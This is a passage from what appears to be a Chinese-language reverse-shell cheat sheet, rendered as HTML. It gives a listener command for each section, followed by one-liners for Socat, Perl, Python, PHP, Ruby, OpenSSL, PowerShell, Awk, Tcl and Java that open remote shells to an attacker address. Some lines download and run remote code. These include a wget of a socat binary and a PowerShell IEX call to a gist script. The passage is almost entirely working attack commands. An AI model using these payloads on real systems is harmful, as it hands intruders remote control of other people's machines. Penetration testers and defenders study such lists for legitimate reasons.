class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>

<h2 id="使用Socat反弹shell"><a href="#使用Socat反弹shell" class="headerlink" title="使用Socat反弹shell"></a>使用Socat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> file:`tty`,raw,echo=<span class="number">0</span> TCP-L:<span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br><span class="line">socat tcp-connect:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> exec:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br><span class="line">wget -q https:<span class="regexp">//gi</span>thub.com<span class="regexp">/andrew-d/</span>static-binaries<span class="regexp">/raw/m</span>aster<span class="regexp">/binaries/</span>linux<span class="regexp">/x86_64/</span>socat -O <span class="regexp">/tmp/</span>socat; chmod +x <span class="regexp">/tmp/</span>socat; <span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span></span><br></pre></td></tr></table></figure>

<h2 id="利用Perl脚本反弹"><a href="#利用Perl脚本反弹" class="headerlink" title="利用Perl脚本反弹"></a>利用Perl脚本反弹</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;10.10.10.11&quot;</span>;<span class="variable">$p</span>=<span class="number">443</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line">perl -MIO -e &#x27;<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>

<p>win平台下执行：</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;10.10.10.11:443&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> while<span class="variable">&lt;&gt;</span>;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="利用Python脚本反弹shell"><a href="#利用Python脚本反弹shell" class="headerlink" title="利用Python脚本反弹shell"></a>利用Python脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<p>IPv4协议如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"><span class="attribute">export</span> RHOST=<span class="string">&quot;10.10.10.11&quot;</span>;export RPORT=<span class="number">443</span>;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(<span class="string">&quot;RHOST&quot;</span>),int(os.getenv(<span class="string">&quot;RPORT&quot;</span>))));[os.dup<span class="number">2</span>(s.fileno(),fd) for fd in (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)&#x27;</span><br><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>);os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>IPv6协议如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -c &#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET<span class="number">6</span>,socket.SOCK_STREAM);s.connect((<span class="string">&quot;dead:beef:2::125c&quot;</span>,<span class="number">443</span>,<span class="number">0</span>,<span class="number">2</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure>

<p>Windows平台如下:</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">C:\Python27\python.exe -c <span class="string">&quot;(lambda __y, __g, __contextlib: <span class="subst">[[[[[[[(s.connect((&#x27;10.10.10.11&#x27;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0]</span>(lambda: None)]<span class="subst">[2]</span>)(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and <span class="subst">[True for __out[0]</span> in <span class="subst">[((s.close(), lambda after: after())[1]</span>)]]<span class="subst">[0]</span>)&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: <span class="subst">[False for __out[0]</span> in <span class="subst">[((p.wait(), (lambda __after: __after()))[1]</span>)]]<span class="subst">[0]</span>&#125;)())))(<span class="subst">[None]</span>))<span class="subst">[1]</span> for p2s_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=p2s, args=[s, p]</span>))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for s2p_thread.daemon in <span class="subst">[(True)]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p_thread&#x27;]</span> in <span class="subst">[(threading.Thread(target=s2p, args=[s, p]</span>))]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;]</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]]<span class="subst">[0]</span>)<span class="subst">[1]</span> for __g<span class="subst">[&#x27;s&#x27;]</span> in <span class="subst">[(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;p2s&#x27;]</span>, p2s.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;]</span>.send(__l<span class="subst">[&#x27;p&#x27;]</span>.stdout.read(1)), __this())<span class="subst">[1]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, __l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;p2s&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;s2p&#x27;]</span>, s2p.__name__ in <span class="subst">[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;]</span>.stdin.write(__l<span class="subst">[&#x27;data&#x27;]</span>), __after())<span class="subst">[1]</span> if (len(__l<span class="subst">[&#x27;data&#x27;]</span>) &gt; 0) else __after())(lambda: __this()) for __l<span class="subst">[&#x27;data&#x27;]</span> in <span class="subst">[(__l[&#x27;s&#x27;]</span>.recv(1024))]]<span class="subst">[0]</span> if True else __after())())(lambda: None) for __l<span class="subst">[&#x27;s&#x27;]</span>, __l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;s2p&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;os&#x27;]</span> in <span class="subst">[(__import__(&#x27;os&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;socket&#x27;]</span> in <span class="subst">[(__import__(&#x27;socket&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;subprocess&#x27;]</span> in <span class="subst">[(__import__(&#x27;subprocess&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;threading&#x27;]</span> in <span class="subst">[(__import__(&#x27;threading&#x27;, __g, __g))]</span>]<span class="subst">[0]</span>)((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="利用PHP脚本反弹shell"><a href="#利用PHP脚本反弹shell" class="headerlink" title="利用PHP脚本反弹shell"></a>利用PHP脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$sock</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);<span class="variable">$proc</span><span class="operator">=</span>proc_open(<span class="string">&quot;/bin/sh -i&quot;</span>, array(<span class="number">0</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">1</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">2</span><span class="operator">=&gt;</span><span class="variable">$s</span>),<span class="variable">$pipes</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);shell_exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);`<span class="operator">/</span>bin<span class="operator">/</span>sh <span class="operator">-</span>i <span class="operator">&lt;&amp;</span><span class="number">3</span> <span class="operator">&gt;&amp;</span><span class="number">3</span> <span class="number">2</span><span class="operator">&gt;&amp;</span><span class="number">3</span>`;&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);system(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);popen(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>, <span class="string">&quot;r&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>\&#x27;<span class="number">127.0</span>.<span class="number">0.1</span>\&#x27;;<span class="variable">$p</span><span class="operator">=</span><span class="number">443</span>;<span class="meta">@error_reporting</span>(<span class="number">0</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;error_log&quot;</span>,<span class="type">NULL</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;log_errors&quot;</span>,<span class="number">0</span>);<span class="meta">@set_time_limit</span>(<span class="number">0</span>);umask(<span class="number">0</span>);<span class="keyword">if</span>(<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="variable">$s</span>,<span class="variable">$p</span>,<span class="variable">$n</span>,<span class="variable">$n</span>))&#123;<span class="keyword">if</span>(<span class="variable">$x</span><span class="operator">=</span>proc_open(\&#x27;<span class="operator">/</span>bin<span class="operator">/</span>sh<span class="variable">$IFS</span><span class="operator">-</span>i\&#x27;,array(array(\&#x27;pipe\&#x27;,\&#x27;r\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;)),<span class="variable">$p</span>,getcwd()))&#123;stream_set_blocking(<span class="variable">$p</span>[<span class="number">0</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$s</span>,<span class="number">0</span>);<span class="keyword">while</span>(<span class="literal">true</span>)&#123;<span class="keyword">if</span>(feof(<span class="variable">$s</span>))die(\&#x27;connection<span class="operator">/</span>closed\&#x27;);<span class="keyword">if</span>(feof(<span class="variable">$p</span>[<span class="number">1</span>]))die(\&#x27;shell<span class="operator">/</span>not<span class="operator">/</span>response\&#x27;);<span class="variable">$r</span><span class="operator">=</span>array(<span class="variable">$s</span>,<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$p</span>[<span class="number">2</span>]);stream_select(<span class="variable">$r</span>,<span class="variable">$n</span>,<span class="variable">$n</span>,null);<span class="keyword">if</span>(in_array(<span class="variable">$s</span>,<span class="variable">$r</span>))fwrite(<span class="variable">$p</span>[<span class="number">0</span>],fread(<span class="variable">$s</span>,<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">2</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">1024</span>));&#125;fclose(<span class="variable">$p</span>[<span class="number">0</span>]);fclose(<span class="variable">$p</span>[<span class="number">1</span>]);fclose(<span class="variable">$p</span>[<span class="number">2</span>]);proc_close(<span class="variable">$x</span>);&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;proc_open/disabled&quot;</span>);&#125;&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;not/connect&quot;</span>);&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="利用Ruby脚本反弹shell"><a href="#利用Ruby脚本反弹shell" class="headerlink" title="利用Ruby脚本反弹shell"></a>利用Ruby脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">open</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)&#x27;</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Windows平台如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="使用OpenSSL反弹shell"><a href="#使用OpenSSL反弹shell" class="headerlink" title="使用OpenSSL反弹shell"></a>使用OpenSSL反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> req -x<span class="number">509</span> -newkey rsa:<span class="number">4096</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line"><span class="attribute">openssl</span> s_server -quiet -key key.pem -cert cert.pem -port <span class="number">443</span></span><br><span class="line"><span class="attribute">ncat</span> --ssl -vv -l -p <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br></pre></td></tr></table></figure>

<h2 id="win平台下使用Powershell反弹shell"><a href="#win平台下使用Powershell反弹shell" class="headerlink" title="win平台下使用Powershell反弹shell"></a>win平台下使用Powershell反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.11&quot;</span>,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (pwd).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line">powershell -nop -c <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.10.11&#x27;,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;</span>)</span><br><span class="line">或</span><br><span class="line">[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(<span class="string">&#x27;<span class="variable">$c</span>=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);<span class="variable">$s</span>=<span class="variable">$c</span>.GetStream();[byte[]]<span class="variable">$bytes</span>=0..65535|%&#123;0&#125;;while((<span class="variable">$i</span>=<span class="variable">$s</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$d</span>=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0,<span class="variable">$i</span>);<span class="variable">$sb</span>=(iex <span class="variable">$d</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sb2</span>=<span class="variable">$sb</span>+&#x27;</span><span class="string">&#x27;PS &#x27;</span><span class="string">&#x27;+(pwd).Path+&#x27;</span><span class="string">&#x27;&gt; &#x27;</span><span class="string">&#x27;;<span class="variable">$sb</span>=([Text.Encoding]::Default).GetBytes(<span class="variable">$sb2</span>);<span class="variable">$s</span>.Write(<span class="variable">$sb</span>,0,<span class="variable">$sb</span>.Length);<span class="variable">$s</span>.Flush()&#125;;<span class="variable">$c</span>.Close()&#x27;</span>))</span><br><span class="line"></span><br><span class="line">powershell -nop -<span class="keyword">enc</span> &#123;reverse <span class="literal">shell</span> <span class="literal">command</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用Awk反弹shell"><a href="#利用Awk反弹shell" class="headerlink" title="利用Awk反弹shell"></a>利用Awk反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;s = <span class="string">&quot;/inet/tcp/0/10.10.10.11/443&quot;</span>; <span class="keyword">while</span>(<span class="number">42</span>) &#123; <span class="keyword">do</span>&#123; <span class="built_in">printf</span> <span class="string">&quot;shell&gt;&quot;</span> |&amp; s; s |&amp; getline c; <span class="keyword">if</span>(c)&#123; <span class="keyword">while</span> ((c |&amp; getline) &gt; <span class="number">0</span>) <span class="built_in">print</span> $<span class="number">0</span> |&amp; s; <span class="built_in">close</span>(c); &#125; &#125; <span class="keyword">while</span>(c != <span class="string">&quot;exit&quot;</span>) <span class="built_in">close</span>(s); &#125;&#125;&#x27; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="TCL脚本反弹shell"><a href="#TCL脚本反弹shell" class="headerlink" title="TCL脚本反弹shell"></a>TCL脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">echo &#x27;<span class="keyword">set</span> s [<span class="keyword">socket</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.11</span> <span class="number">443</span>];<span class="keyword">while</span> <span class="number">42</span> &#123; <span class="keyword">puts</span> -nonewline <span class="variable">$s</span> <span class="string">&quot;shell&gt;&quot;</span>;<span class="keyword">flush</span> <span class="variable">$s</span>;<span class="keyword">gets</span> <span class="variable">$s</span> c;<span class="keyword">set</span> e <span class="string">&quot;exec $c&quot;</span>;<span class="keyword">if</span> &#123;![<span class="keyword">catch</span> &#123;<span class="keyword">set</span> r [<span class="keyword">eval</span> <span class="variable">$e</span>]&#125; err]&#125; &#123; <span class="keyword">puts</span> <span class="variable">$s</span> <span class="variable">$r</span> &#125;; <span class="keyword">flush</span> <span class="variable">$s</span>; &#125;; <span class="keyword">close</span> <span class="variable">$s</span>;&#x27; | tclsh</span><br></pre></td></tr></table></figure>

<h2 id="Java版本反弹shell"><a href="#Java版本反弹shell" class="headerlink" title="Java版本反弹shell"></a>Java版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<p>linux平台：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">r = Runtime<span class="selector-class">.getRuntime</span>()</span><br><span class="line"><span class="selector-tag">p</span> = r<span class="selector-class">.exec</span>(<span class="selector-attr">[<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="selector-attr">[]</span>)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.waitFor</span>()</span><br></pre></td></tr></table></figure>

<p>windows平台：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>

<p>创建线程：</p>
